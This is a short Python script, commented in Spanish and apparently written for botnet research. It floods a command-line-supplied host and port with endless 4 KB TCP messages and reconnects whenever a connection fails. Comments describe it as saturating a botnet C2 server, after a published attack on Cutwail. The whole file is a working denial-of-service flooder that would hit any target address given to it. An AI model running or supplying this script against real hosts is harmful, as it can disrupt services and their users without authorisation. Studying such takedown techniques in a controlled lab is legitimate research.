import socket
import time
import sys
import random

C2_IP = sys.argv[1]
C2_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9000

# Payload de relleno (benigno): mensajes grandes para saturar el canal del C2.
# Representa el ataque de saturación descrito por Saito y Stringhini (2015) sobre Cutwail.
PAYLOAD_SIZE = 4096   # bytes por mensaje
BASE_MESSAGES = [
    "heartbeat", "status_request", "peer_update", "control_sync",
    "routing_refresh", "retransmit", "resend_command",
]


def build_message():
    base = random.choice(BASE_MESSAGES)
    # relleno sintético hasta PAYLOAD_SIZE (datos benignos, sin significado)
    padding = "X" * (PAYLOAD_SIZE - len(base))
    return (base + ":" + padding).encode()


def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((C2_IP, C2_PORT))

            # Flood continuo: envío masivo sin pausa para saturar el C2.
            while True:
                sock.sendall(build_message())
        except Exception:
            time.sleep(0.5)


if __name__ == "__main__":
    main()
